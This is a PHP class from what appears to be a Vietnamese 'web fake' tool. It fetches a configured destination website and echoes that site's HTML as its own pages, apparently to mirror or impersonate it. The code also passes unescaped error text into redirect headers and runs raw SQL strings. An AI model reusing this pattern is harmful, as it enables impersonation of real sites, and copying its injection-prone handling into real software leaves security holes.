<?php
include_once 'Config.php';
include 'simple_html_dom.php';

class App
{
    public $host = HOST;
    public $username = USERNAME;
    public $password = PASSWORD;
    public $db = DATABASE_NAME;
    public $destination = LINK_WEB_FAKE;
    public $logo_time = LOGO_DELAY_TIME;
    public $app_version = APP_VERSION;
    public $base_url;
    public $full_url;
    public $request;
    public $main_domain;
    public $startNode;
    public $slug = "";
    public $crawl_stt = false;
    public $_json ;
    protected $html;
    protected $con;


    function __construct()
    {
        $this->con = @new mysqli($this->host, $this->username, $this->password, $this->db);
        if ($this->con->connect_error) {
            $msg = $this->con->connect_error;
            $title = "Lỗi cấu hình database !";
            header("Location: Error?code=500&msg=$msg&title=$title");
        } else {
            //$this->GetAppConfig();
            $full_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
            $list  = explode('/', $full_url);
            for($i=0;$i<count($list)-1;$i++){
                $this->base_url .= $list[$i]."/";
            }
            $arr = explode('/', $_SERVER['SCRIPT_NAME']);
            $arr = end($arr);
            $arr = explode('.', $arr);
            $this->request = strtolower($arr[0]);
            if (empty($this->request) || strtolower($this->request) == "index") {
                $this->request = "index";
            }
            $this->startNode = $this->base_url . "?" . $this->app_version . '/';
            $this->main_domain = $this->GetDomain();
            $this->full_url = $full_url;          
        }
    }
    //Check request and redirect app to correct url that matches with the app version
    public function CheckAppVersionRequest()
    {
        $rq = $_SERVER['QUERY_STRING'];
        $rq = explode("/", $rq);
        $r_url = $this->startNode;
        $redirect = false;
        $_timeout = "4";

        if ($rq[0] == "" || strtolower($rq[0] != strtolower($this->app_version))) {
            $require = true;
            require_once 'Loading.php';
        } 
        else {
            $this->crawl_stt = true;
        }
    }

    public function GetAppConfig(){
        // $s = "select * from config where type='destination'";
        // $check = $this->Select($s,1);
        // if($check && !empty($check['Value'])){
        //     $this->destination = $check['Value'];
        // }

        $s1 = "select * from config where type='logo_time'";
        $check1 = $this->Select($s1,1);
        if($check1 && !empty($check1['Value'])){
            $this->logo_time = $check1['Value'];
        }

        $s2 = "select * from config where type='app_version'";
        $check2 = $this->Select($s2,1);
        if($check2 && !empty($check2['Value'])){
            $this->app_version = $check2['Value'];
        }

    }

    public function Get_Web($url)
    {
        $user_agent = 'Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0';
        $options = array(

            CURLOPT_CUSTOMREQUEST  => "GET",        //set request type post or get
            CURLOPT_POST           => false,        //set to GET
            CURLOPT_USERAGENT      => $user_agent, //set user agent
            CURLOPT_COOKIEFILE     => "cookie.txt", //set cookie file
            CURLOPT_COOKIEJAR      => "cookie.txt", //set cookie jar
            CURLOPT_RETURNTRANSFER => true,     // return web page
            CURLOPT_HEADER         => false,    // don't return headers
            CURLOPT_FOLLOWLOCATION => true,     // follow redirects
            CURLOPT_ENCODING       => "",       // handle all encodings
            CURLOPT_AUTOREFERER    => true,     // set referer on redirect
            CURLOPT_CONNECTTIMEOUT => 120,      // timeout on connect
            CURLOPT_TIMEOUT        => 120,      // timeout on response
            CURLOPT_MAXREDIRS      => 10,       // stop after 10 redirects
        );

        $ch      = curl_init($url);
        curl_setopt_array($ch, $options);
        $content = curl_exec($ch);
        $err     = curl_errno($ch);
        $errmsg  = curl_error($ch);
        $header  = curl_getinfo($ch);
        curl_close($ch);

        $header['errno']   = $err;
        $header['errmsg']  = $errmsg;
        $header['content'] = $content;
        return $header;
    }

    public function GetConnection(){
        return $this->con;
    }
    
    public function GetDomain($url = null)
    {
        if ($url == "" || $url == null) {
            return $this->GetDomain($this->destination);
        } else {
            $domain = "abc.test";
            if (gettype($url) == "array") {
                if (str_contains($url[0], "http") && count($url) >= 3) {
                    if ($url[1] == "" && $url[2] != "") {
                        if (str_contains($_url[2] = strtolower($url[2]), "www")) {
                            $a = explode('www.', $_url[2]);
                            if (count($a) >= 2 && $a[0] == "") {
                                $domain = $a[1];
                            }
                        } else
                            $domain = $url[2];
                    }
                }
            } else
            if (gettype($url) == "string") {
                $_url = explode('/', $url);
                if (str_contains($_url[0], "http") && count($_url) >= 3) {
                    if ($_url[1] == "" && $_url[2] != "") {
                        if (str_contains($_url[2] = strtolower($_url[2]), "www")) {
                            $a = explode('www.', $_url[2]);
                            if (count($a) >= 2 && $a[0] == "") {
                                $domain = $a[1];
                            }
                        } else
                            $domain = $_url[2];
                    }
                }
            }
            return $domain;
        }
    }

    public function GetContent($c = null)
    {
        if ($c == null) {
            $c = $this->html;
        }
        echo $c;
    }

    public function CheckCrawlStatus(){
        return $this->CheckRequestStatus($this->destination,0,0);
    }

    public function CheckRequestStatus($destination,$mode=0,$redirect=1)
    {
        try {
            $opts = array(
                'http' => array(
                    'header' => 'User-Agent:MyAgent/1.0\r\n',
                    'Content-Security-Policy' => 'upgrade-insecure-requests'
                )
            );
            $context = stream_context_create($opts);
            $html = @file_get_html($destination, false);
            if (!$html || htmlentities($html) == "") {
                $this->_json = new stdClass();
                if($mode==0){
                    $title = "KHÔNG FAKE ĐƯỢC";
                    $msg = "WEB CHẶN CRAWLER HOẶC LINK BỊ LỖI !";
                    $code = "500 | 404 | 403";
                }
                else 
                {
                    $title = "Trang web không tồn tại";
                    $msg = "Liên kết bạn truy cập bị lỗi hoặc không tồn tại!";
                    $code = 404;
                }
                
                $this->_json->title = $title;
                $this->_json->msg = $msg;
                $this->_json->code = $code;

                if($redirect==1){
                    $_url = "Error?code=$code&msg=$msg&title=$title";
                    header("Location: $_url");
                }
                else
                return false;
                
            } else {
                if($redirect==1){
                    return $html;
                }
                else
                {
                    return true;
                }
            }
            return false;
        } catch (Exception $e) {
            echo "Lỗi " . $e->getMessage();
        } catch (Error $e) {
            echo "Error " . $e->getMessage();
        }
    }

    public function ProcessSlugParamater($slug=null){
        if($this->crawl_stt){
            $rq = $_SERVER['QUERY_STRING'];
            $rq = explode("/", $rq);
            $sl = count($rq);
            $url = $this->destination;
            $mode = 1;

            if($sl>1){
                for($i=1;$i<$sl;$i++){
                    if($rq[$i]!="")
                    {
                        $s = "/";
                        if($i==1){
                            if(substr($url,-1)=="/"){
                                $s = "";
                            }
                        }
                        else {
                            $s = "/";
                        }
                        $url .= $s.$rq[$i];
                    }
                    
                }
            }
            $this->html = $this->CheckRequestStatus($url,$mode);
        }


    }

    public function RunThread($t = null)
    {
        $rq = $this->request;
        if($rq=="index"){
            $url = "";
            $list = explode("/",$this->base_url);
            for($i=0;$i<count($list)-1;$i++){
                $url .= $list[$i]."/";
            }
            $this->base_url = $url;
            $html = $this->CheckRequestStatus($this->destination,0);
            if ($html!=false) {
                $this->CheckAppVersionRequest();
                $this->ProcessSlugParamater();
            }
        }
    }

    public function HttpPost($url, $data)
    {
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        echo $response;
    }

    public function Select($q,$return_mode=0)
    {
        $con = $this->con;
        $result = $con->query($q);
        if ($result && $result->num_rows > 0) {
            if ($return_mode != 0) {
                return mysqli_fetch_assoc($result);
            } else {
                return $result;
            }
        } else {
            return false;
            // return [
            //     "type" => "select", 
            //     "action" => "select", 
            //     "message" => $con->error
            // ];
        }
    }

    public function Update($q)
    {
        $result = $this->con->query($q);
        if ($result) {
            return TRUE;
        } else {
            // return ["type" => "error",
            // "action" => "update", 
            // "message" => $this->con->error];
            return false;
        }
    }

    public function Delete($q)
    {
        $con = $this->con;
        $result = $con->query($q);
        return $result;
        // if ($result && $result->num_rows > 0) {
        //     return $result;
        // } else {
        //     return ["type" => "delete", 
        //     "action" => "delete", 
        //     "message" => $this->con->error
        // ];
        // }
    }

    public function Insert($q)
    {
        $con = $this->con;
        $result = $con->query($q);
        if ($result === TRUE) {
            return $con->insert_id;
        } else
            return 0;
    }

    function getUniqueVisitorCount($ip)
    {
        if (!isset($_SESSION['current_user'])) {
            $file = 'counter.txt';
            if (!$data = @file_get_contents($file)) {
                file_put_contents($file, base64_encode($ip));
                $_SESSION['visitor_count'] = 1;
            } else {
                $decodedData = base64_decode($data);
                $ipList      = explode(';', $decodedData);

                if (!in_array($ip, $ipList)) {
                    array_push($ipList, $ip);
                    file_put_contents($file, base64_encode(implode(';', $ipList)));
                }
                $_SESSION['visitor_count'] = count($ipList);
            }
            $_SESSION['current_user'] = $ip;
        }
    }
}

$App = new App();
